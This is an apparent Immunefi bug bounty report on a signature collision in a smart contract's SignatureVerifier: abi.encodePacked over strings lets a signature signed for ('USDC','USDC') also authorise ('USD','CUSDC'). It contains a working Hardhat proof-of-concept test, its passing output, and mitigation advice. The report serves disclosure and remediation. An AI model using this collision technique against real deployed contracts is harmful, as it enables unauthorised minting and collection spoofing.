# 57314 sc medium signature replay and hash collision via abi encodepacked in signatureverifier sol

* **Submitted on:** Oct 25th 2025 at 07:13:23 UTC by @iehnnkta for [Audit Comp | Belong](https://immunefi.com/audit-competition/audit-comp-belong)
* **Report ID:** #57314
* **Report Type:** Smart Contract
* **Severity:** Medium
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/platform/Factory.sol>
* **Impact:** Unauthorized minting of NFTs

## Description / Intro

* The factory creates Access Tokens using an off-chain signature which is verified in `SignatureVerifier::checkAccessTokenInfo`.
* The signed message is constructed with `abi.encodePacked` over multiple dynamic fields (`name`, `symbol`, `contractURI`, `feeNumerator`, `chainId`).
* This concatenation is ambiguous because `abi.encodePacked` concatenates raw bytes of dynamic strings without length delimiters. Distinct inputs can collide (for example, "USDC" + "USDC" == "USD" + "CUSDC" when concatenated), enabling signature collisions across different (name, symbol) pairs.

## Vulnerability Details

* `SignatureVerifier::checkAccessTokenInfo` hashes:
  * `keccak256(abi.encodePacked(name, symbol, contractURI, feeNumerator, block.chainid))`
* Because `abi.encodePacked` does not include length separators for dynamic types, different combinations of inputs can produce the same byte sequence and thus the same hash and signature.
* Example collision: a signature issued for (name = "USDC", symbol = "USDC") can be reused to create a different collection with (name = "USD", symbol = "CUSDC").

## Impact

* Authorization bypass for collection creation: an attacker can deploy unauthorized collections using a signature intended for a different collection.
* Collection spoofing and loss of control over what the platform signs; potential reputational damage and misdirected user funds.
* The same issue appears across the `SignatureVerifier` contract wherever `abi.encodePacked` is used for hashing signed data.

## References

* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/utils/SignatureVerifier.sol#L53-L74>
* <https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/utils/SignatureVerifier.sol#L81-L99>

## Mitigation

* Replace `abi.encodePacked` with `abi.encode` when building the message to hash. `abi.encode` includes type and length information, preventing ambiguous concatenation.
* Alternatively, use EIP-712 typed structured data signing to robustly encode signed fields.

## Proof of Concept

Use the following test inside `factory.test.ts` under the `Deployment` describe block.

{% stepper %}
{% step %}

### Setup & context

* The test demonstrates a signature collision where a signature for (name = "USDC", symbol = "USDC") is reused to create a different collection (name = "USD", symbol = "CUSDC").
* Fixture provides: `factory`, `alice`, `bob`, `signer`, and `chainId`.
  {% endstep %}

{% step %}

### 1) Alice obtains a valid signature and creates (name = "USDC", symbol = "USDC")

Code:

```ts
it('PoC: reuse signature via abi.encodePacked collision (USDC,USDC) => (USD,CUSDC)', async () => {
  const { factory, alice, bob, signer } = await loadFixture(fixture);

  const feeNumerator = 600;
  const contractURI = 'contractURI/USDC';
  const price = ethers.utils.parseEther('0.01');

  // 1) Alice creates (name=USDC, symbol=USDC)
  const name1 = 'USDC';
  const symbol1 = 'USDC';
  const sig1 = EthCrypto.sign(
    signer.privateKey,
    hashAccessTokenInfo(name1, symbol1, contractURI, feeNumerator, chainId),
  );
  const info1: AccessTokenInfoStruct = {
    metadata: { name: name1, symbol: symbol1 },
    contractURI,
    paymentToken: NATIVE_CURRENCY_ADDRESS,
    mintPrice: price,
    whitelistMintPrice: price,
    transferable: true,
    maxTotalSupply: BigNumber.from('1000'),
    feeNumerator,
    collectionExpire: BigNumber.from('86400'),
    signature: sig1,
  } as unknown as AccessTokenInfoStruct; // satisfy type

  const tx1 = await factory.connect(alice).produce(info1, ethers.constants.HashZero);
  await expect(tx1).to.emit(factory, 'AccessTokenCreated');

  const infoAlice = await factory.nftInstanceInfo(name1, symbol1);
  expect(infoAlice.nftAddress).to.not.equal(ZERO_ADDRESS);
  expect(infoAlice.creator).to.equal(alice.address);
```

{% endstep %}

{% step %}

### 2) Bob reuses the same signature to create (name = "USD", symbol = "CUSDC")

Code (continuation):

```ts
  // 2) Bob reuses the same signature to create (name=USD, symbol=CUSDC)
  const name2 = 'USD';
  const symbol2 = 'CUSDC'; // Note: encodePacked collision => 'USD' + 'CUSDC' == 'USDCUSDC'
  const info2: AccessTokenInfoStruct = {
    metadata: { name: name2, symbol: symbol2 },
    contractURI,
    paymentToken: NATIVE_CURRENCY_ADDRESS,
    mintPrice: price,
    whitelistMintPrice: price,
    transferable: true,
    maxTotalSupply: BigNumber.from('1000'),
    feeNumerator,
    collectionExpire: BigNumber.from('86400'),
    signature: sig1, // reuse Alice's signature
  } as unknown as AccessTokenInfoStruct;

  const tx2 = await factory.connect(bob).produce(info2, ethers.constants.HashZero);
  await expect(tx2).to.emit(factory, 'AccessTokenCreated');

  const infoBob = await factory.nftInstanceInfo(name2, symbol2);
  expect(infoBob.nftAddress).to.not.equal(ZERO_ADDRESS);
  expect(infoBob.creator).to.equal(bob.address);

  // Ensure both collections exist and are different
  expect(infoBob.nftAddress).to.not.equal(infoAlice.nftAddress);
});
```

{% endstep %}
{% endstepper %}

Test output after running:

```
✔ PoC: reuse signature via abi.encodePacked collision (USDC,USDC) => (USD,CUSDC) (695ms)

1 passing (697ms)
```

This confirms a successful reuse of the same signature to create two distinct collections due to encoding ambiguity.
